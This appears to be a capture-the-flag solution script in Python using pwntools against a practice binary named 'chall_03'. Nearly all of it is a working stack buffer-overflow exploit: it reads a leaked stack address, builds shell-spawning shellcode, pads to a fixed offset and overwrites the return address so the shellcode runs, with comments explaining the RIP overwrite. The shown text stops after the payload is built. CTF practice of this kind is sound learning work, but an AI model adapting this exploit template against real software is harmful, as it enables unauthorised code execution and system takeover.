from pwn import *
context.arch = "amd64"
p = process("./chall_03")
p.recvuntil(b":) ")

leaked_address = int(p.recvline().decode('utf-8').strip(), 16)

offset = 0x140
shellcode = asm(shellcraft.sh())

payload = shellcode + cyclic(offset + 8 - len(shellcode)) + p64(leaked_address)

# we put + leaked_address at the end because we're directly seting RIP at that point.
# Then once we set it to the leaked address rip executes the shell code.